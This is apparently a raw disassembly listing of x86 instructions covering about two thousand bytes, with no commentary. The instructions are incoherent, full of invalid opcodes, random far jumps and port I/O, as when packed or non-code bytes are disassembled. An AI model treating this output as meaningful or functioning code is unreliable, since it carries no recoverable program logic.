  4062b9:	inc    ecx
  4062ba:	imul   esi,DWORD PTR [esi+0x4d08ba5f],0x78
  4062c1:	inc    ebx
  4062c2:	dec    ebx
  4062c3:	ins    BYTE PTR es:[edi],dx
  4062c4:	cwde   
  4062c5:	jne    0x40626c
  4062c7:	pop    edx
  4062c8:	test   DWORD PTR ds:0x32a92a1e,eax
  4062ce:	inc    eax
  4062cf:	xor    eax,0x19f0a02f
  4062d4:	shr    ebp,1
  4062d6:	mov    ebp,0x293b95ff
  4062db:	inc    ebx
  4062dc:	sbb    ah,dl
  4062de:	dec    edi
  4062df:	fisttp QWORD PTR [esi+0xd204e73]
  4062e5:	inc    esi
  4062e6:	int3   
  4062e7:	mov    ds:0x98369e8d,eax
  4062ec:	repnz jmp 0x9dc4:0x548c84f3
  4062f4:	inc    esp
  4062f5:	dec    DWORD PTR [ebp-0x34]
  4062f8:	push   cs
  4062f9:	test   dh,al
  4062fb:	shl    DWORD PTR [edx],cl
  4062fd:	add    DWORD PTR [ebp-0x3bef40a2],ecx
  406303:	push   ss
  406304:	mov    eax,ds:0xc67976f0
  406309:	xor    ecx,DWORD PTR [edi+0x4d]
  40630c:	ret    
  40630d:	ins    DWORD PTR es:[edi],dx
  40630e:	sub    BYTE PTR [ecx+0x25],dh
  406311:	xor    esp,DWORD PTR [edx-0x6c]
  406314:	adc    BYTE PTR [esi],0xb8
  406317:	xchg   ebp,eax
  406319:	je     0x4062dc
  40631b:	pop    ds
  40631c:	mov    ebp,0xbee15dd8
  406321:	mov    dh,0x64
  406323:	jnp    0x40631e
  406325:	clc    
  406326:	pop    eax
  406327:	push   esi
  406328:	xchg   ebp,eax
  406329:	sub    al,0xa4
  40632b:	ret    0xd769
  40632e:	push   0xe
  406330:	mov    ebx,0x98ce3023
  406335:	jp     0x406318
  406337:	lods   eax,DWORD PTR ds:[esi]
  406338:	les    eax,FWORD PTR [edx-0x19a116d9]
  40633e:	addr16 out 0x75,eax
  406341:	xchg   DWORD PTR ds:0x3a9d454c,ebx
  406347:	fistp  WORD PTR [edx-0x792be415]
  40634d:	repz jno 0x4062e7
  406350:	popf   
  406351:	mov    dh,0xed
  406353:	shr    DWORD PTR [ebx],0x7f
  406356:	xor    eax,0xecfdb2ef
  40635b:	sub    dl,0xb8
  40635e:	push   esi
  40635f:	jns    0x4062eb
  406361:	(bad)  
  406362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406363:	jmp    0xe349:0xaabc3923
  40636a:	ss cs adc eax,0xba08e05e
  406371:	es ins DWORD PTR es:[edi],dx
  406373:	sub    eax,0x1b54faf2
  406378:	rcr    DWORD PTR ds:0x13cd1b6d,cl
  40637e:	mov    ecx,0x117c5180
  406383:	fsubrp st(1),st
  406385:	pop    ebx
  406386:	aam    0xf6
  406388:	pop    edx
  406389:	inc    ebx
  40638a:	ret    0x22b4
  40638d:	(bad)  
  40638e:	dec    ebp
  40638f:	mov    WORD PTR [esi+ebp*8+0x2c0df159],es
  406396:	js     0x4063d2
  406398:	inc    esi
  406399:	ret    0xe671
  40639c:	retf   
  40639d:	mov    al,0xe3
  40639f:	retf   
  4063a0:	xor    al,0xa6
  4063a2:	xor    eax,0x90bf493d
  4063a7:	jns    0x4063b9
  4063a9:	sub    ebx,0x68ba5dc2
  4063af:	shr    ecx,cl
  4063b1:	sub    DWORD PTR [ecx+0x4f53a521],ebp
  4063b7:	int3   
  4063b8:	in     al,0x58
  4063ba:	jmp    0x40637f
  4063bc:	inc    ebp
  4063bd:	adc    BYTE PTR [esp+edi*8+0x298619fd],dh
  4063c4:	pop    esi
  4063c5:	(bad)  
  4063c7:	shl    esp,1
  4063c9:	leave  
  4063ca:	sub    dl,ch
  4063cc:	jae    0x40634e
  4063ce:	mov    ecx,0x9658505f
  4063d3:	and    DWORD PTR [ebx],0x73a463d8
  4063d9:	xchg   ebx,eax
  4063da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063db:	test   al,0x60
  4063dd:	dec    esp
  4063de:	mov    ch,0x98
  4063e0:	fcom   QWORD PTR ds:0xa6610b0d
  4063e6:	adc    ebp,DWORD PTR [ecx-0x60]
  4063e9:	adc    DWORD PTR [eax+0x1d36795f],edi
  4063ef:	jecxz  0x4063f8
  4063f1:	add    BYTE PTR [ecx-0x1f69fe28],cl
  4063f7:	in     eax,0x13
  4063f9:	sbb    al,0xc4
  4063fb:	mov    edi,0xd830171b
  406400:	jb     0x40647a
  406402:	lea    esp,[esi-0x3]
  406405:	mov    al,0x19
  406407:	(bad)  
  406409:	xchg   edx,eax
  40640a:	das    
  40640b:	jae    0x406485
  40640d:	mov    ds:0xb25a4155,eax
  406412:	push   esp
  406413:	in     al,0x26
  406415:	sub    al,0xb5
  406417:	nop
  406418:	in     al,0x81
  40641a:	mov    eax,ds:0x7ce659c
  40641f:	mov    bh,0xcd
  406421:	mov    ds:0xad6b83fa,eax
  406426:	jnp    0x406425
  406428:	daa    
  406429:	ret    0xd9fc
  40642c:	lea    ebx,[ebp+ecx*8+0x7f]
  406430:	mov    ch,0xb2
  406432:	sahf   
  406433:	xor    BYTE PTR [ecx+0x73c05ddf],dl
  406439:	fld    DWORD PTR [eax-0xc]
  40643c:	jg     0x4063c7
  40643e:	pop    esi
  40643f:	(bad)  
  406440:	add    al,0xa3
  406442:	push   cs
  406443:	push   edi
  406444:	bound  esi,QWORD PTR [eax+0x50]
  406447:	cmc    
  406448:	cli    
  406449:	sub    edx,DWORD PTR [esi+ebp*2+0x34]
  40644d:	(bad)  
  40644f:	pop    ds
  406450:	or     eax,0xdd8abb53
  406455:	push   ebx
  406456:	fldcw  WORD PTR [eax+0x21]
  406459:	(bad)  
  40645a:	neg    BYTE PTR [ebp-0x5c58cdb6]
  406460:	sub    al,0xbe
  406463:	ror    BYTE PTR [ecx+esi*4+0x7],0x8
  406468:	imul   edi,DWORD PTR [ebp+0x699a903b],0x14
  40646f:	ja     0x4064d9
  406471:	lods   eax,DWORD PTR ds:[esi]
  406472:	rcl    DWORD PTR [edx+0x37e846b8],1
  406478:	xlat   BYTE PTR ds:[ebx]
  406479:	push   ebp
  40647a:	(bad)  
  40647b:	and    ebp,DWORD PTR [esi+0x769e0474]
  406481:	pop    esi
  406482:	sar    DWORD PTR [esi-0x58],1
  406485:	cdq    
  406486:	inc    esi
  406487:	je     0x4064a9
  406489:	mov    cl,ah
  40648b:	ror    DWORD PTR [ecx+0x6a5bff27],1
  406491:	mov    BYTE PTR [edi-0x4087c30f],bl
  406497:	and    ebx,ecx
  406499:	adc    al,0x8
  40649b:	lods   eax,DWORD PTR ds:[esi]
  40649c:	and    eax,0x960408b
  4064a1:	mul    cl
  4064a3:	dec    ebx
  4064a4:	and    ebp,DWORD PTR [ebx+0x6579ac3e]
  4064aa:	jns    0x406438
  4064ac:	mov    BYTE PTR [edi],bl
  4064ae:	outs   dx,BYTE PTR ds:[esi]
  4064af:	xchg   edi,eax
  4064b0:	or     ch,BYTE PTR [edx]
  4064b2:	cmp    ebx,DWORD PTR [esi+0x7783c70]
  4064b8:	mov    bh,0xc5
  4064ba:	xor    eax,0xe85529cb
  4064bf:	dec    edx
  4064c0:	es (bad) 
  4064c2:	in     al,dx
  4064c3:	or     dl,ah
  4064c5:	pop    ebx
  4064c6:	arpl   bp,si
  4064c8:	call   0x9f2c34e2
  4064cd:	aaa    
  4064ce:	es adc ecx,edx
  4064d1:	xchg   esi,eax
  4064d2:	(bad)
  4064d5:	sbb    BYTE PTR [ecx-0x60],ch
  4064d8:	pop    ebp
  4064d9:	std    
  4064da:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064dc:	push   esp
  4064dd:	and    eax,0x5ecd858e
  4064e2:	repz js 0x406543
  4064e5:	lds    esi,FWORD PTR [ebp-0x5a]
  4064e8:	in     eax,0x22
  4064ea:	test   BYTE PTR [ecx+0x2c2a8ae4],bh
  4064f0:	push   edi
  4064f1:	xchg   ebx,eax
  4064f2:	add    DWORD PTR [edi+0x50],0x1c
  4064f6:	inc    ecx
  4064f7:	int3   
  4064f8:	aam    0x56
  4064fa:	cmp    ebx,DWORD PTR [esi-0x57]
  4064fd:	loop   0x40650d
  4064ff:	call   0x55634f94
  406504:	ds stos BYTE PTR es:[edi],al
  406506:	shl    BYTE PTR [eax+eiz*1],0x5b
  40650a:	ror    DWORD PTR [esi],cl
  40650c:	mov    al,0x53
  40650e:	leave  
  40650f:	call   0x36e35baf
  406514:	in     al,dx
  406515:	es js  0x406546
  406518:	or     BYTE PTR [ecx-0x59],al
  40651b:	push   ebp
  40651c:	dec    eax
  40651d:	inc    esp
  40651e:	lods   eax,DWORD PTR ds:[esi]
  40651f:	(bad)  
  406520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406521:	and    DWORD PTR [ecx-0x404e7a6f],eax
  406527:	dec    ebp
  406528:	ret    
  406529:	retf   0x560d
  40652c:	sbb    eax,DWORD PTR [eax-0x67]
  40652f:	xor    al,0xfe
  406531:	popf   
  406532:	xor    ch,al
  406534:	mov    ebp,0xabe03379
  406539:	in     al,0x75
  40653b:	mov    ecx,0xb9653db7
  406540:	aad    0xb8
  406542:	push   esp
  406543:	scas   al,BYTE PTR es:[edi]
  406544:	add    DWORD PTR [esi+ecx*8+0x71965b01],esi
  40654b:	fwait
  40654c:	rcr    ebp,0x28
  40654f:	mov    esi,0x9e659c9d
  406554:	or     cl,BYTE PTR [edi-0x201abb4b]
  40655a:	and    bh,BYTE PTR [eax+0x34]
  40655d:	popa   
  40655e:	mov    dh,0xff
  406560:	push   ds
  406561:	lahf   
  406562:	jo     0x4064e8
  406564:	mov    eax,ds:0xe8904214
  406569:	cmp    al,0xb7
  40656b:	jge    0x4065ab
  40656d:	test   BYTE PTR [ebp-0x7e],ch
  406570:	pushf  
  406571:	xor    al,BYTE PTR [ecx+0x79]
  406574:	loope  0x4065d9
  406576:	lock or ch,al
  406579:	out    dx,eax
  40657a:	sub    ebx,DWORD PTR [edi+0x7e484956]
  406580:	lods   eax,DWORD PTR ds:[esi]
  406581:	(bad)  
  406582:	adc    bl,BYTE PTR [edi]
  406584:	add    edi,DWORD PTR [edx-0x68]
  406587:	fsub   QWORD PTR [eax-0x33]
  40658a:	ins    BYTE PTR es:[edi],dx
  40658b:	int    0x6
  40658d:	aas    
  40658e:	cld    
  40658f:	or     al,0xfe
  406591:	rol    bl,1
  406593:	sub    DWORD PTR [edx-0x7dfaa5ed],eax
  406599:	xor    al,0x44
  40659b:	repnz push cs
  40659d:	inc    ebx
  40659e:	xchg   ebx,eax
  40659f:	xor    bl,bh
  4065a1:	(bad)  
  4065a3:	arpl   bp,dx
  4065a5:	mov    esi,0xaee44c74
  4065aa:	in     al,0xcb
  4065ac:	in     al,dx
  4065ad:	adc    edi,DWORD PTR [esi]
  4065af:	ret    
  4065b0:	cmp    bl,dh
  4065b2:	(bad)  [ecx+0xf]
  4065b5:	mov    BYTE PTR [eax],ch
  4065b7:	hlt    
  4065b8:	mov    ebx,0x46060bb4
  4065bd:	(bad)  
  4065be:	lods   al,BYTE PTR ds:[esi]
  4065bf:	popa   
  4065c0:	dec    ecx
  4065c1:	loop   0x406598
  4065c3:	icebp  
  4065c4:	pop    ebx
  4065c5:	aas    
  4065c6:	fcom   QWORD PTR [edi+0x19]
  4065c9:	call   0x1d43:0xbd842a69
  4065d0:	inc    ecx
  4065d1:	aad    0x9d
  4065d3:	or     al,0xb0
  4065d5:	jnp    0x406588
  4065d7:	pinsrw mm1,WORD PTR [esp+edx*1],0x68
  4065dc:	imul   edi,DWORD PTR [edx],0x13e7abfc
  4065e2:	daa    
  4065e3:	jmp    0xfd93b0fe
  4065e8:	rcr    DWORD PTR [eax*4-0x221c7d1f],cl
  4065ef:	dec    ebp
  4065f0:	mov    ah,0x1f
  4065f2:	int    0x99
  4065f4:	cld    
  4065f5:	in     eax,0x4c
  4065f7:	loopne 0x4065e1
  4065f9:	push   0xffffffe6
  4065fb:	adc    eax,0x7349a597
  406600:	adc    BYTE PTR [esi-0x5c4a80c2],cl
  406606:	add    ebp,DWORD PTR [eax-0x4a3d1b3d]
  40660c:	or     al,0x7a
  40660e:	adc    DWORD PTR [edi],edx
  406610:	sub    eax,0xc10c224c
  406615:	adc    ebx,esp
  406617:	and    eax,0x710820f3
  40661c:	xor    BYTE PTR [ecx],ah
  40661e:	xor    DWORD PTR [ecx+0x43],0xffffffa5
  406622:	sbb    al,0x21
  406624:	(bad)  
  406625:	dec    edi
  406626:	sbb    al,0xa2
  406628:	retf   0x36b8
  40662b:	clc    
  40662c:	ret    
  40662d:	int3   
  40662e:	test   al,0x32
  406630:	xor    al,0x93
  406632:	mov    eax,0xa77affe0
  406637:	or     DWORD PTR [ebx+0x3ad5328a],ebp
  40663d:	push   esi
  40663e:	pop    ds
  40663f:	push   0xf0cb81ba
  406644:	pop    ds
  406645:	rcl    DWORD PTR es:[edx+0xee17201],1
  40664c:	pop    ax
  40664e:	cmp    cl,BYTE PTR [edx]
  406650:	xchg   esi,eax
  406651:	jl     0x4065d9
  406653:	fst    DWORD PTR [ecx-0x70fa9302]
  406659:	sub    dh,BYTE PTR [eax]
  40665b:	mov    ebp,0x309087fe
  406660:	pop    esp
  406661:	xchg   esi,edi
  406663:	bound  ebx,QWORD PTR [ebx-0x495efc4]
  406669:	cmc    
  40666a:	xor    dl,BYTE PTR [esi-0x54]
  40666d:	imul   ecx,DWORD PTR [edx-0x6d2476a1],0xf91da03b
  406677:	and    eax,0x60996c26
  40667c:	and    BYTE PTR [ebx+ebp*4+0x53],dl
  406680:	repz jbe 0x4066c3
  406683:	stos   BYTE PTR es:[edi],al
  406684:	inc    ecx
  406685:	xor    DWORD PTR [ecx-0x6e3a7be1],edx
  40668b:	bound  esp,QWORD PTR [eax]
  40668d:	loopne 0x40668e
  40668f:	mov    bh,0xe1
  406691:	cmp    dl,BYTE PTR [eax-0x302fbdbc]
  406697:	jecxz  0x4066f9
  406699:	ins    BYTE PTR es:[edi],dx
  40669a:	sub    al,0x7a
  40669c:	aaa    
  40669d:	js     0x4066bc
  40669f:	adc    eax,0x4bf67d66
  4066a4:	pop    ecx
  4066a5:	xchg   ebp,eax
  4066a6:	(bad)  
  4066a7:	loop   0x4066c6
  4066a9:	pusha  
  4066aa:	sar    esi,1
  4066ac:	lds    edx,FWORD PTR [ebx-0x7972da40]
  4066b2:	mov    cl,0xe5
  4066b4:	in     eax,0x24
  4066b6:	cli    
  4066b7:	test   al,0x60
  4066b9:	aaa    
  4066ba:	loopne 0x40667f
  4066bc:	inc    edx
  4066bd:	or     bh,BYTE PTR [ebx+0x63]
  4066c0:	cwde   
  4066c1:	std    
  4066c2:	push   DWORD PTR [ecx+esi*4+0x45]
  4066c6:	or     DWORD PTR [esp+edi*1-0x2a53863e],0xffffffcc
  4066ce:	nop
  4066cf:	popf   
  4066d0:	fcomi  st,st(7)
  4066d2:	jecxz  0x4066c7
  4066d4:	rcl    ebx,0xcf
  4066d7:	ins    BYTE PTR es:[edi],dx
  4066d8:	ins    DWORD PTR es:[edi],dx
  4066d9:	push   ss
  4066da:	inc    esp
  4066db:	pop    esp
  4066dc:	lahf   
  4066dd:	or     eax,0xfd78c530
  4066e2:	nop
  4066e3:	jbe    0x406727
  4066e5:	fldcw  WORD PTR [ecx]
  4066e7:	xor    ah,dh
  4066e9:	sbb    ebp,DWORD PTR [ebx+0x63]
  4066ec:	sar    DWORD PTR [esi-0x23ec9821],cl
  4066f2:	push   edi
  4066f3:	fsubp  st(6),st
  4066f5:	outs   dx,BYTE PTR ds:[esi]
  4066f6:	imul   ecx,DWORD PTR [edx],0x8a89a3e3
  4066fc:	or     al,BYTE PTR [edx]
  4066fe:	mov    ecx,0xb217db96
  406703:	xchg   esi,eax
  406704:	inc    ecx
  406705:	test   esp,eax
  406707:	dec    edi
  406708:	pop    ds
  406709:	retf   0x117f
  40670c:	fcmovb st,st(6)
  40670e:	or     DWORD PTR [edi+0x1e],0xfffffff9
  406712:	and    BYTE PTR [ecx+0x65],ch
  406715:	cmp    al,0x89
  406717:	daa    
  406718:	out    0xda,al
  40671a:	inc    esp
  40671b:	in     al,0xd8
  40671d:	lods   eax,DWORD PTR gs:[esi]
  40671f:	scas   al,BYTE PTR es:[edi]
  406720:	repnz dec ebp
  406722:	mov    ecx,DWORD PTR [esi-0x3]
  406725:	out    dx,eax
  406726:	jle    0x406765
  406728:	or     edx,DWORD PTR [ebp+0xb2d2765]
  40672e:	pop    esp
  40672f:	mov    cs,WORD PTR [edx-0x60]
  406732:	jp     0x406771
  406734:	add    eax,0x542e4cae
  406739:	inc    eax
  40673a:	xchg   ebp,eax
  40673b:	or     DWORD PTR [ecx+0x60],0xfffffff7
  40673f:	jecxz  0x4067a7
  406741:	in     al,0xe1
  406743:	jb     0x406765
  406745:	out    0x8f,eax
  406747:	dec    ebp
  406748:	and    DWORD PTR [ecx+0x13c26af6],esp
  40674e:	mov    esp,0xa9de2ad4
  406753:	or     bl,BYTE PTR [edi+0x54ae27ba]
  406759:	jmp    0xb572dc8d
  40675e:	add    eax,0xbcf0fda3
  406763:	(bad)  
  406764:	clc    
  406765:	jge    0x406727
  406767:	shr    DWORD PTR [ecx+ebx*4],1
  40676a:	lea    ecx,[edx]
  40676c:	pushf  
  40676d:	ret    0xaa1f
  406770:	stos   DWORD PTR es:[edi],eax
  406771:	dec    edx
  406772:	arpl   WORD PTR [ebp+0x43800cdc],cx
  406778:	sbb    ah,bh
  40677a:	jg     0x4067ae
  40677c:	and    dl,BYTE PTR [ebx+ebp*4-0x40]
  406780:	loopne 0x4067ca
  406782:	xor    cl,0xfb
  406785:	scas   eax,DWORD PTR es:[edi]
  406786:	jo     0x4067c0
  406788:	jmp    0xa91c:0x872519b2
  40678f:	das    
  406790:	repnz sbb eax,0xea803db3
  406796:	aad    0x28
  406798:	lahf   
  406799:	pop    eax
  40679a:	outs   dx,BYTE PTR ds:[esi]
  40679b:	cmp    DWORD PTR [edx+0x4c1e646],0x1fdbf5b5
  4067a5:	aam    0x69
  4067a7:	mov    esp,0x337eca4f
  4067ac:	xchg   DWORD PTR [edx+0x72820b63],esi
  4067b2:	add    ebp,eax
  4067b4:	loopne 0x40681c
  4067b6:	sub    eax,0x9e79d422
  4067bb:	leave  
  4067bc:	les    esp,FWORD PTR [edi+0x7f459375]
  4067c2:	hlt    
  4067c3:	bound  ebx,QWORD PTR [ebp-0x34]
  4067c6:	sahf   
  4067c7:	lahf   
  4067c8:	clc    
  4067c9:	mov    bh,0xf8
  4067cb:	sbb    edx,DWORD PTR [edi+eax*1-0x69]
  4067cf:	(bad)
  4067d2:	push   0x2e
  4067d4:	out    0x98,al
  4067d6:	sbb    ah,al
  4067d8:	inc    esp
  4067d9:	pop    edx
  4067da:	pop    ss
  4067db:	jnp    0x40682b
  4067dd:	cmp    al,BYTE PTR [edi+esi*1-0x1ac431e3]
  4067e4:	(bad)  
  4067e5:	jl     0xf5643f23
  4067eb:	retf   0x558d
  4067ee:	aad    0xf2
  4067f0:	call   0x739430c
  4067f5:	jns    0x406831
  4067f7:	cmp    BYTE PTR [edx+0xdcbece6],bl
  4067fd:	push   ds
  4067fe:	add    ebp,ebx
  406800:	xchg   ecx,eax
  406801:	cmp    BYTE PTR [ebx+0x74],dl
  406804:	add    ebx,DWORD PTR [edi]
  406806:	lods   al,BYTE PTR ds:[esi]
  406807:	xor    al,0x84
  406809:	sub    dh,BYTE PTR ds:0xbd0c62bb
  40680f:	into   
  406810:	cdq    
  406811:	dec    ecx
  406812:	or     al,BYTE PTR [ecx-0x3d12774]
  406818:	sbb    ch,BYTE PTR [ebx+0x6c536248]
  40681e:	jno    0x406836
  406820:	jecxz  0x4067bb
  406822:	mov    al,ds:0x407be836
  406827:	adc    al,0xc5
  406829:	dec    edx
  40682a:	scas   al,BYTE PTR es:[edi]
  40682b:	test   DWORD PTR [eax+0x53],eax
  40682e:	sub    ch,ch
  406830:	(bad)  
  406831:	ss mov dl,0xc0
  406834:	or     edx,DWORD PTR [ebx+esi*4]
  406837:	clc    
  406838:	mov    esi,0xadf1aa2d
  40683d:	call   FWORD PTR [esi+ecx*8-0x3401b358]
  406844:	mov    edi,ebx
  406846:	jmp    0xfed9:0x9def4eb6
  40684d:	fadd   st,st(5)
  40684f:	int3   
  406850:	aam    0x4b
  406852:	sub    DWORD PTR [esi-0x25],edi
  406855:	dec    ecx
  406856:	mov    ds,WORD PTR [edi-0x31971e84]
  40685c:	xor    BYTE PTR [ebx],al
  40685e:	add    dh,BYTE PTR [ebx+0x79]
  406861:	ds xchg edi,eax
  406863:	push   ebp
  406864:	jmp    0x238b:0x559531c2
  40686b:	(bad)  
  40686c:	pusha  
  40686d:	sub    eax,0xe0310074
  406872:	inc    eax
  406873:	stc    
  406874:	jo     0x406817
  406876:	mov    ebx,0x737331f3
  40687b:	popa   
  40687c:	test   al,0x9c
  40687e:	cld    
  40687f:	shl    edx,cl
  406881:	mov    ah,0xf8
  406883:	push   eax
  406884:	aam    0xb2
  406886:	dec    ebp
  406887:	mov    edx,0x352a165c
  40688c:	mov    al,0x5f
  40688e:	push   cs
  40688f:	or     eax,0x37b4963d
  406894:	jne    0x4068bf
  406896:	xchg   ebx,eax
  406897:	call   0xac78:0xb07607a7
  40689e:	ror    esi,1
  4068a0:	mov    cs,WORD PTR [esi-0x11]
  4068a3:	dec    ebp
  4068a4:	clc    
  4068a5:	xchg   esp,eax
  4068a6:	jae    0x4068f8
  4068a8:	jmp    0x5626e3b7
  4068ad:	scas   eax,DWORD PTR es:[edi]
  4068ae:	sub    eax,0xe6d1ef42
  4068b3:	adc    BYTE PTR [edi],ch
  4068b5:	mov    ecx,0xa26bc14f
  4068ba:	fdivrp st(3),st
  4068bc:	popa   
  4068bd:	sbb    DWORD PTR [ecx+0x49a67a31],ebp
  4068c3:	mov    DWORD PTR [ecx+0x40668dcb],edi
  4068c9:	push   eax
  4068ca:	cmp    DWORD PTR [edi],edi
  4068cc:	xchg   ebx,eax
  4068cd:	sahf   
  4068ce:	fdiv   QWORD PTR [esi+esi*8]
  4068d1:	xchg   ebp,eax
  4068d2:	push   ebp
  4068d3:	ret    0x284c
  4068d6:	pop    eax
  4068d7:	inc    ecx
  4068d8:	rcl    ebp,0x51
  4068db:	push   ebx
  4068dc:	jmp    DWORD PTR [ebp+0x783c6a0f]
  4068e2:	in     eax,dx
  4068e3:	push   DWORD PTR [eax-0x2a]
  4068e6:	ficomp WORD PTR [edi]
  4068e8:	leave  
  4068e9:	repz test BYTE PTR [edi+0x220c4baf],cl
  4068f0:	pop    ss
  4068f1:	xor    DWORD PTR [esi-0x7d],esi
  4068f4:	ja     0x406888
  4068f6:	push   esp
  4068f7:	int    0x91
  4068f9:	mov    eax,ds:0x86d06bad
  4068fe:	and    al,0x74
  406900:	inc    ebx
  406901:	jg     0x4068a8
  406903:	xor    BYTE PTR ds:0x93cf8a41,bl
  406909:	aad    0xaf
  40690b:	xchg   ebx,eax
  40690c:	cwde   
  40690d:	dec    ebx
  40690e:	mov    esp,0xa1f9f2bd
  406913:	xor    eax,0xedc50721
  406918:	push   cs
  406919:	outs   dx,BYTE PTR ds:[esi]
  40691a:	imul   esi,DWORD PTR [ecx+0x67],0x1e
  40691e:	mov    eax,ds:0xc5859bc4
  406923:	xchg   esi,eax
  406924:	repnz inc eax
  406926:	xchg   edx,eax
  406927:	mov    edi,DWORD PTR [ecx-0x43]
  40692a:	xor    eax,0xf48b358
  40692f:	push   esi
  406930:	cwde   
  406931:	cli    
  406932:	retf   0x968c
  406935:	ret    0x467
  406938:	fstp   TBYTE PTR [ebx+0x68]
  40693b:	sub    DWORD PTR [edi-0xbe64357],0xffffffc4
  406942:	retf   0x3303
  406945:	xchg   BYTE PTR [ecx],dh
  406947:	ds ins BYTE PTR es:[edi],dx
  406949:	fs mov dl,0x8b
  40694c:	mov    DWORD PTR gs:0xfb1444ed,ebp
  406953:	jns    0x4068d5
  406955:	push   eax
  406956:	push   cs
  406957:	leave  
  406958:	(bad)  [edx]
  40695a:	cmp    eax,0x73c003a2
  40695f:	push   ebx
  406960:	sub    BYTE PTR [edi+0xc4eb6d5],ah
  406966:	(bad)  
  406967:	je     0x4069af
  406969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40696a:	pop    edi
  40696b:	(bad)  
  40696c:	mov    ebp,0x18de3c8c
  406971:	fnsave [edx]
  406973:	xor    esp,esi
  406975:	xchg   DWORD PTR [esi-0x5b],ebx
  406978:	push   eax
  406979:	out    0x6e,al
  40697b:	ins    BYTE PTR es:[edi],dx
  40697c:	or     BYTE PTR [eax+0x135fd4cc],0x33
  406983:	push   eax
  406984:	xor    DWORD PTR [eax+eax*4],ecx
  406987:	mov    dl,0x24
  406989:	push   esp
  40698a:	fsub   QWORD PTR [eax-0x2]
  40698d:	mov    edx,0x9ff39b78
  406992:	jne    0x406934
  406994:	or     ebx,DWORD PTR ds:0xb0d98a
  40699a:	jmp    0x53c7:0xbfe9e50e
  4069a1:	push   esi
  4069a2:	or     eax,0x75f16fe1
  4069a7:	cmp    al,0xf5
  4069a9:	fld1   
  4069ab:	xor    ecx,DWORD PTR [ebx+0x46]
  4069ae:	into   
  4069af:	(bad)  
  4069b0:	add    BYTE PTR [edi+0x56],dh
  4069b3:	jmp    0xd9f1:0xff20eeeb
  4069ba:	imul   esp,DWORD PTR [eax-0x6e],0x36
  4069be:	mov    ds:0xeaa5d6c4,eax
  4069c3:	fild   WORD PTR [eax+0x4855407d]
  4069c9:	js     0x406986
  4069cb:	mov    al,0x8e
  4069cd:	je     0x4069e0
  4069cf:	shr    BYTE PTR [edx],1
  4069d1:	jns    0x40698e
  4069d3:	icebp  
  4069d4:	cmp    DWORD PTR [edx+ecx*4],0x9
  4069d8:	sub    al,0x20
  4069da:	mov    ebp,0x5d4ef5be
  4069df:	enter  0xefef,0x59
  4069e3:	in     eax,0xda
  4069e5:	in     eax,0xb
  4069e7:	jnp    0x4069af
  4069e9:	dec    eax
  4069ea:	push   ecx
  4069eb:	fstp   st(0)
  4069ed:	aam    0xc0
  4069ef:	pop    ds
  4069f0:	and    al,0xca
  4069f2:	pop    edi
  4069f3:	mov    ah,dl
  4069f5:	and    bh,BYTE PTR [ebp-0x7a31e6bd]
  4069fb:	jmp    0x56fc9e5b
  406a00:	rcl    DWORD PTR [eax+ecx*8-0x7b],0xee
  406a05:	mov    ebx,0x8bc1c70
  406a0a:	xchg   edx,eax
  406a0b:	in     eax,0x4b
  406a0d:	lods   al,BYTE PTR ds:[esi]
  406a0e:	sti    
  406a0f:	std    
  406a10:	jnp    0x406a87
  406a12:	inc    esp
  406a13:	repnz cwde 
  406a15:	pop    ds
  406a16:	adc    esp,DWORD PTR [ebp+0x2c61ea7]
  406a1c:	pop    edx
  406a1d:	outs   dx,BYTE PTR ds:[esi]
  406a1e:	inc    esp
  406a1f:	arpl   ax,bp
  406a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a22:	or     al,BYTE PTR [esi-0x362cd1e1]
  406a28:	(bad)  
  406a29:	push   0x73
  406a2b:	dec    ebp
  406a2c:	inc    edx
  406a2d:	inc    ebp
  406a2e:	xor    eax,ebx
  406a30:	mov    bl,0x9b
  406a32:	pusha  
  406a33:	fnstenv [ebp+0x63]
  406a36:	cmp    eax,0x9e126f65
  406a3b:	(bad)  [ecx+ebp*1]
  406a3e:	fwait
  406a3f:	jle    0x406aa1
  406a41:	sub    al,0x78
  406a43:	dec    esi
  406a44:	test   al,0xa9
  406a46:	cmp    ah,BYTE PTR [ebp+0x3d]
  406a49:	pusha  
  406a4a:	test   DWORD PTR [edi+0x5d],esp
  406a4d:	and    al,0x83
  406a4f:	push   ds
  406a50:	mov    BYTE PTR [ecx-0x56],al
  406a53:	pop    ds
  406a54:	push   esi
  406a55:	adc    al,0xc
  406a57:	add    al,0xa2
  406a59:	ret    0xacb8
  406a5c:	and    eax,0x87621a8f
  406a61:	and    ah,BYTE PTR [esi+0x5a]
  406a64:	xor    BYTE PTR [eax-0x3132d175],0x79
  406a6b:	nop
  406a6c:	sub    ebx,DWORD PTR [esi+0x67]
  406a6f:	xor    dl,bh
  406a71:	inc    esi
  406a72:	retf   0xde1e
  406a75:	(bad)  
  406a76:	push   ss
  406a77:	cmp    ebx,DWORD PTR [esi+edi*8-0x7cfbdd41]
  406a7e:	sbb    dl,BYTE PTR [edx-0x780aedc5]
  406a84:	xchg   esi,eax
  406a85:	fdiv   DWORD PTR [esi+ebp*2-0x52]
  406a89:	aaa    
  406a8a:	ret    0xe7a4
  406a8d:	inc    edx
  406a8e:	shl    DWORD PTR ds:0xbf6faa79,cl
  406a94:	out    0x23,al
  406a96:	addr16 (bad) 
  406a98:	daa    
  406a99:	xor    al,0x2e
  406a9b:	push   edx
  406a9c:	jb     0x406a56
  406a9e:	add    edx,DWORD PTR [edi+0x14]
  406aa1:	dec    ecx
  406aa2:	imul   eax,DWORD PTR [edx-0xfe2467b],0x25
  406aa9:	(bad)  
  406aaa:	ss push esi
  406aac:	call   0xa9081a5e
  406ab1:	cmp    bl,BYTE PTR [edx+eiz*8+0x6e]
  406ab5:	pusha  
  406ab6:	fwait
  406ab7:	lods   al,BYTE PTR ds:[esi]
  406ab8:	jne    0x406aa8
  406aba:	dec    ebx
  406abb:	rcl    DWORD PTR [ebx-0x510cf16b],cl
  406ac1:	jne    0x406aae
  406ac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ac4:	fbstp  TBYTE PTR [edi+0x46]
  406ac7:	aad    0xa5
  406ac9:	sub    cl,ch
  406acb:	outs   dx,DWORD PTR ds:[esi]
  406acc:	or     BYTE PTR [bx],al
